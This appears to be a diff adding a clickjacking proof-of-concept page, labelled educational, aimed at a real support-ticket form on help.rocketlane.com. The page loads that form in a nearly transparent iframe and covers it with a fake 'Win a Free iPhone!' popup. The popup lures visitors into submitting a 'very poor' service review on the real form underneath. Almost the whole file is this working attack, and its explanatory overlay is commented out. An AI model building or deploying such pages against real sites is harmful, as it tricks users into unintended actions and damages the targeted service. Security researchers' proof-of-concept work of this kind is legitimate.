@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Clickjacking Demo (Educational Only)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <style>
+    body {
+      background-color: #f8f9fa;
+    }
+
+    #disclaimer {
+      background: #ffdddd;
+      color: #a00;
+      padding: 10px;
+      text-align: center;
+      font-weight: bold;
+      border-bottom: 2px solid #a00;
+    }
+
+    .fake-popup {
+      position: fixed;
+      top: 60px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #fff;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      z-index: 9999;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .fake-popup .close {
+      position: absolute;
+      top: 5px;
+      right: 10px;
+      font-size: 1.5rem;
+      color: #888;
+      cursor: pointer;
+    }
+
+    .fake-popup .close:hover {
+      color: #000;
+    }
+
+    .spinner-border {
+      width: 2rem;
+      height: 2rem;
+      margin-bottom: 15px;
+    }
+
+    .arrow {
+      font-size: 2rem;
+      color: red;
+      animation: bounce 1s infinite;
+      position: absolute;
+      bottom: 100px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 9999;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translate(-50%, 0); }
+      50% { transform: translate(-50%, -10px); }
+    }
+
+    .overlay-note {
+      position: absolute;
+      top: 250px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(255,255,255,0.95);
+      padding: 15px;
+      border-radius: 8px;
+      z-index: 9999;
+      box-shadow: 0 0 10px #ccc;
+    }
+
+    iframe {
+      opacity: 0.1;
+      pointer-events: auto;
+      position: relative;
+      width: 100%;
+      height: 500px;
+      border: none;
+      z-index: 1;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+  </style>
+</head>
+<body>
+
+<div id="disclaimer">
+  ⚠️ This is a Proof-of-Concept (PoC) for educational and awareness purposes ONLY. THIS POC IS HALF AS PER SECURITY RULES 
+</div>
+
+<!-- Fake Prize Box -->
+<div class="fake-popup " id="popupBox">
+  <div class="close" onclick="closePopup()">×</div>
+  <div class="spinner-border text-primary" role="status">
+    <span class="visually-hidden">Loading...</span>
+  </div>
+  <h4 class="text-success">🎉 Win a Free iPhone!</h4>
+  <p>Complete the steps below:</p>
+  <ol class="text-start">
+    <li>Fill out a review saying service was <strong>very poor</strong>.</li>
+    <li>Click the <strong>Submit</strong> button below the form.</li>
+  </ol>
+  <p class="fw-bold text-danger">You will be automatically entered into our iPhone giveaway!</p>
+</div>
+
+
+
+<!-- Real iFrame under trick -->
+<iframe id="iframeTarget" src="https://help.rocketlane.com/support/tickets/new?ticket_form=report_an_issue"></iframe>
+
+<!-- Overlay note
+<div class="overlay-note" id="noteBox">
+  🕵️‍♂️ This overlay simulates a clickjacking attempt. You're clicking a real form under a fake message.
+</div> -->
+
+<!-- Bootstrap JS -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+
+<!-- Script to handle popup -->
+<script>
+  function closePopup() {
+    document.getElementById('popupBox').classList.add('hidden');
+    document.getElementById('arrow').classList.add('hidden');
+    document.getElementById('noteBox').classList.add('hidden');
+    document.getElementById('iframeTarget').style.opacity = '1';
+  }
+</script>
+
+</body>
+</html>
